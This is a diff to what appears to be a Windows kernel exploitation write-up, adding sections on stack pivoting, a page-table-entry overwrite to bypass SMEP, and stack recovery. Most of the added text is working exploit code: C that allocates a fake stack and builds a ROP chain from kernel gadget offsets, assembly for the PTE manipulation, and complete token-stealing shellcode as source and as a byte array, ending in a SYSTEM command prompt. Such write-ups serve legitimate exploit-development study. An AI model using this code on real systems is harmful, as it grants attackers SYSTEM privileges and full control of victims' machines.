@@ -478,8 +478,192 @@ I am not going to explain how to write ROP chains, and find ROP gadgets. If you 
 
 #### Stack Pivoting
 
-#### PTE Bit Flipping
+We have one chance to execute code so what do we execute? We execute some code that will pivot onto a fake stack, created by us. Whet the code `ret`s our ROP chain on our fake stack will execute.
+
+In our exploit code we create a fake stack:
+
+```c
+// stack pivoting gadgets/values
+QWORD STACK_PIVOT_ADDR = 0xF6000000;
+QWORD MOV_ESP = kernelBase + 0x23a227;  // mov esp, 0xF6000000; ret;
+
+// prepare the new stack
+QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
+LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+printf("[+] VirtualAlloc, allocated address: 0x%p\n", stack);
+
+if (stack == 0x0)
+{
+  printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
+  return 1;
+}
+
+printf("[+] VirtualLock, address: 0x%p\n", stack);
+if (!VirtualLock((LPVOID)stack, 0x14000)) {
+ printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
+ return 1;
+}
+```
+
+Notice that we use the `VirtualLock` Win32 API, according to Microsoft the API "Locks the specified region of the process's virtual address space into physical memory, ensuring that subsequent access to the region will not incur a page fault." This is important as our Kernel stack must be committed to physical memory.
+
+We also have our first gadget that is going to pivot the stack to our user space allocation.
+
+Next we write our ROP chain to this location:
+
+```c
+int index = 0;
+
+// our rop chain
+QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);
+
+// PTE owner bit flipping
+*(rop + index++) = kernelBase + 0x919cf4;       // pop rcx; ret;
+*(rop + index++) = (QWORD)alloc;
+...
+```
+
+`alloc` is our shellcode in user space, this is the allocation that we are setting the owner bit as owned by the Kernel. The next section explains what we will write in our ROP chain.
+
+After the ROP chain we `ret` to our user space shellcode:
+
+```c
+// ret to user space shellcode
+*(rop + index++) = (QWORD)alloc;
+
+// execute the rop chain
+ExecuteGadget(hDevice, MOV_ESP);
+
+system("cmd.exe");
+```
+
+Notice that we execute our `MOV_ESP` gadget (this is the code execution bug being triggered, which pivots the stack). We will be using token stealing shellcode to elevate our processes token to `SYSTEM`. The final command executes a new command prompt in this context.
+
+#### PTE Table Overwrite
+
+I decided to use the PTE Table Overwrite technique. This technique effectively plays by SMEP rules and marks the user space page as though it is owned by the Kernel. This allows us to build an exploit for the target without using the values in the wiki. :-)
+
+I won't explain this technique, it has already been done by [Connor McGarr](https://twitter.com/33y0re) in his blog [Leveraging Page Table Entries for Windows Kernel Exploitation](https://connormcgarr.github.io/pte-overwrites/), what I will do is present the `asm` that is required to carry out this technique (convoluted based upon the ROP gadgets I found). You will have to find the ROP gadgets yourself and add them to your exploit:
+
+```asm
+pop rcx, [address of your shellcode]
+call MiGetPteAddress				; you will need to resolve this address
+mov r8, rax					; r8 = Shellcode's PTE address
+mov r10, rax                                  	; r10 = Shellcode's PTE address
+mov rax, qword[rax]				; rax = Shellcode's PTE value
+mov r8, rax					; r8 = Shellcode's PTE value
+mov rcx, r8                                     ; rcx = Shellcode's PTE value
+pop rax, 0x4					;
+sub rcx, rax					; rcx = modified PTE value
+mov qword[r10], rax				;
+wbinvd 						;
+```
+
+The `MiGetPteAddress` call is a little bit tricky in our ROP chain becasue we have to know what this is as an ofset of the Kernel Base address we disclosed. To do this I used my debuggee lab to display the code in **WinDbg**:
+
+```
+1: kd> uf nt!MiGetPteAddress
+nt!MiGetPteAddress:
+fffff800`10d42bc4 48c1e909        shr     rcx,9
+fffff800`10d42bc8 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
+fffff800`10d42bd2 4823c8          and     rcx,rax
+fffff800`10d42bd5 48b80000000080deffff mov rax,0FFFFDE8000000000h
+fffff800`10d42bdf 4803c1          add     rax,rcx
+fffff800`10d42be2 c3              ret
+```
+
+I loaded the **target** `ntoskrnl.exe` file into **IDA** and searched for the following sequence of bytes:
+
+```
+48 c1 e9 09 48 b8 f8 ff ff ff 7f
+```
+
+This returned several functions, upon examining them I found the function I was looking for, which revealed the offset:
+
+<img width="436" alt="Screenshot 2024-08-25 at 11 20 55" src="https://github.com/user-attachments/assets/ce8da837-2955-4d9c-be92-987987933261">
 
 #### User Space Shellcode
 
+The user space shellcode is the one we will `ret` to when we have marked it as being owend by the Kernel. It is fairly standard token stealing shellcode:
+
+```asm
+BITS 64
+SECTION .text
+    SYS_PID equ 0x04
+    PRCB_DATA equ 0x180
+    CURRENT_THREAD equ 0x08
+    APC_STATE equ 0x98
+    PROCESS equ 0x20
+    UNIQUE_PROCESS_ID equ 0x440
+    ACTIVE_PROCESS_LINKS equ 0x448
+    TOKEN equ 0x4b8
+
+global main
+
+main:
+find_process:
+    xor rax, rax                                  ; RAX = 0
+    mov rax, [gs:rax+PRCB_DATA+CURRENT_THREAD]    ; RAX = *CurrentThread
+    mov rax, [rax+APC_STATE+PROCESS]              ; RAX = *ApcState.Process
+    mov r8, rax                                   ; R8 = *ApcState.Process
+    mov r9, SYS_PID                               ; R9 = 0x4
+
+next_system_process:
+    mov r8, [r8+ACTIVE_PROCESS_LINKS]             ; R8 = ActiveProcessLinks.Flink (next process offset)
+    sub r8, ACTIVE_PROCESS_LINKS                  ; R8 = *EPROCESS (next process)
+    cmp [r8+UNIQUE_PROCESS_ID], r9                ; is EPROCESS.UniqueProcessId = R9 (0x4)
+    jnz next_system_process                       ; if not then loop
+
+found_system_process:
+    mov rcx, [r8+TOKEN]                           ; RCX = *EPROCESS.Token
+    and cl, 0xf0                                  ; Clear out _EX_FAST_REF RefCnt
+    mov [rax+TOKEN], rcx                          ; *ApcState.Process in RAX (current) token
+                                                  ; is replaced with the system one
+recover:
+    sub rdx, 0x18
+    mov rsp, rdx
+    ret
+```
+
+This code finds the `SYSTEM` process, steals the token, and assigns it to the running process. We need to compile this and insert this somewhere near the top of our exploit:
+
+```c
+// shellcode
+unsigned char shellcode[] = {
+  0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88,
+  0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00,
+  0x00, 0x00, 0x49, 0x89, 0xc0, 0x41, 0xb9, 0x04,
+  0x00, 0x00, 0x00, 0x4d, 0x8b, 0x80, 0x48, 0x04,
+  0x00, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 0x00,
+  0x00, 0x4d, 0x39, 0x88, 0x40, 0x04, 0x00, 0x00,
+  0x75, 0xe9, 0x49, 0x8b, 0x88, 0xb8, 0x04, 0x00,
+  0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
+  0x04, 0x00, 0x00, 0x48, 0x83, 0xea, 0x18, 0x48,
+  0x89, 0xd4, 0xc3
+};
+
+// allocate memory for the shellcode
+LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+if (!alloc)
+{
+  printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
+  return 1;
+}
+
+printf("[+] Memory allocated: 0x%p\n", alloc);
+// copy the shellcode in to the memory
+RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
+printf("[+] Shellcode copied to: 0x%p\n", alloc);
+```
+
+The eagle eyed may have noticed how I recovered the stack. That is next!
+
 #### Stack Recovery
+
+If we don't recover the stack following our exploit in Kernel space it is inevitable that the OS will BSOD. We need somehow to recover back to execution flow in the driver and recover the stack to its former state. Whilst doing this we need to be mindful of [register volatility](https://learn.microsoft.com/en-us/cpp/build/x64-software-conventions?view=msvc-170#register-volatility-and-preservation).
+
+While I was initially debugging my exploit I noticed that as the `_guard_dispatch_icall_fptr()` call was being made the `rdx` register always had a value `0x18` higher than `rsp`. Provided I didn't change the value in `rdx` I could use this register to restore `rsp` at the end of my shellcode.
+
+
+
